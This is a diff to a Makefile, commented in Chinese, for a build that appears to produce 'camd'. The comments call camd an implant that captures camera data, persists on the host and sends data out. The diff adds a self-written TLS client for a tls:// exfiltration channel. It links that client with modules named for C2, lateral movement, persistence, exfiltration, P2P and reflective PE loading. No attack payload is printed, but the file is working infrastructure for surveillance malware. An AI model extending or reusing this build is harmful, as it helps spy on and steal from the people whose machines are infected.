@@ -24,7 +24,11 @@ DEP_I    := -I../17_loader/include -I../19_defense/include
 # 只引用它们的接口。
 DAEMON_I := -I../09_persistence/include -I../21_exfil/include \
             -I../14_p2p/include -I../02_c2/include -I../08_lateral/include
-CFLAGS   ?= -std=c99 -O2 -Wall -Wextra -Wpedantic -Iinclude $(DEP_I) $(DAEMON_I)
+# tls:// 出口需要自研 TLS 客户端的头文件。刻意不加进 DEP_I：DEP_I 作用于
+# 每一个测试二进制，而只有 camd 与 test_cam_daemon 链了 cam_daemon.o。
+TLS_I    := -I../25_tls/include -I../00_crypto/include
+CFLAGS   ?= -std=c99 -O2 -Wall -Wextra -Wpedantic -Iinclude $(DEP_I) $(DAEMON_I) \
+            $(TLS_I)
 CXXFLAGS ?= -std=c++17 -O2 -Wall -Wextra -Iinclude
 LDLIBS   ?= -lm
 
@@ -82,6 +86,18 @@ C2OBJS      := ../14_p2p/build/c2.o ../14_p2p/build/c2_frame.o \
                ../14_p2p/build/crypto_x25519.o
 LATLIB      := ../08_lateral/build/proxy.o ../08_lateral/build/lateral.o
 
+# tls:// 出口：自研 TLS 1.2 客户端（25_tls）。
+#
+# 只进 camd 与 test_cam_daemon —— 那两个是唯一链 cam_daemon.o 的目标。
+# 放进 PORT_OBJS 会让**每一个**测试二进制都背上 RSA/X25519/GCM：构建变慢，
+# 且把大数运算的攻击面塞进根本不联网的测试里。
+#
+# 不含 tls_server.c：camd 是客户端，服务端代码不该出现在植入体里。
+# 不含 00_crypto：gcm/hash/x25519 已由上面的 C2OBJS 提供，重复链会撞符号。
+TLS_SRCS := ../25_tls/src/bn.c ../25_tls/src/asn1.c ../25_tls/src/rsa.c \
+            ../25_tls/src/x509.c ../25_tls/src/tls.c
+TLS_OBJS := $(TLS_SRCS:../25_tls/src/%.c=$(BUILD)/tls/%.o)
+
 # 上游产物不参与本 Makefile 的增量判断（它们由上游自己的 make 管），
 # 但必须声明为 order-only 依赖，否则首次构建时链接器可能拿到空/旧文件。
 DAEMON_DEPS := $(PERSIST_OBJ) $(EXFIL_OBJS) $(P2PLIB) $(C2OBJS) $(LATLIB)
@@ -130,6 +146,13 @@ dirs:
 $(BUILD)/%.o: src/%.c include/camera.h | dirs
 	$(CC) $(CFLAGS) -c $< -o $@
 
+# 25_tls 客户端源码。放 build/tls/ 子目录而非 build/ 根：
+# 上面的通用规则是 src/%.c -> build/%.o，25_tls 的 bn.c/rsa.c 等若落进
+# build/ 根会与同名目标混淆（且把上游源码的产物混进本模块产物目录）。
+$(BUILD)/tls/%.o: ../25_tls/src/%.c | dirs
+	@mkdir -p $(BUILD)/tls
+	$(CC) $(CFLAGS) -c $< -o $@
+
 # 复用的外部模块目标文件（17_loader 的 PE 解析 / 19_defense 的桩字节）
 $(BUILD)/dep/loader_pe.o: ../17_loader/src/pe.c | dirs
 	@mkdir -p $(BUILD)/dep
@@ -156,23 +179,23 @@ $(BUILD)/test_%: tests/test_%.c $(PORT_OBJS) $(DEP_OBJS) $(BUILD)/synth_pe.o | d
 # cam_daemon 测试：显式规则，覆盖上面的通用模式规则。
 # 额外链入驻留 / 回传 / 信元三个上游模块，把「采集—驻留—回传」真正串起来。
 $(BUILD)/test_cam_daemon: tests/test_cam_daemon.c $(PORT_OBJS) $(DAEMON_OBJ) \
-                          $(DEP_OBJS) $(BUILD)/synth_pe.o $(DAEMON_DEPS) \
-                          | dirs upstream-deps
+                          $(DEP_OBJS) $(TLS_OBJS) $(BUILD)/synth_pe.o \
+                          $(DAEMON_DEPS) | dirs upstream-deps
 	$(CC) $(CFLAGS) $< $(PORT_OBJS) $(DAEMON_OBJ) $(DEP_OBJS) \
 	      $(BUILD)/synth_pe.o \
 	      $(PERSIST_OBJ) $(EXFIL_OBJS) $(LATLIB) $(C2OBJS) $(P2PLIB) \
-	      -o $@ $(LDLIBS)
+	      $(TLS_OBJS) -o $@ $(LDLIBS)
 
 # camd 部署入口：与 test_cam_daemon 同一套依赖，但不链 synth_pe.o（那是 PE
 # 合成构造器，只有反射加载类测试用得上），入口换成 cam_daemon_main.o。
 $(CAMBIN_OBJ): src/cam_daemon_main.c include/cam_daemon.h include/camera.h | dirs
 	$(CC) $(CFLAGS) -c $< -o $@
 
-$(CAMDBIN): $(CAMBIN_OBJ) $(PORT_OBJS) $(DAEMON_OBJ) $(DEP_OBJS) $(DAEMON_DEPS) \
-            | dirs upstream-deps
+$(CAMDBIN): $(CAMBIN_OBJ) $(PORT_OBJS) $(DAEMON_OBJ) $(DEP_OBJS) $(TLS_OBJS) \
+            $(DAEMON_DEPS) | dirs upstream-deps
 	$(CC) $(CFLAGS) $< $(PORT_OBJS) $(DAEMON_OBJ) $(DEP_OBJS) \
 	      $(PERSIST_OBJ) $(EXFIL_OBJS) $(LATLIB) $(C2OBJS) $(P2PLIB) \
-	      -o $@ $(LDLIBS)
+	      $(TLS_OBJS) -o $@ $(LDLIBS)
 
 test: $(TEST_BINS)
 	@fail=0; \
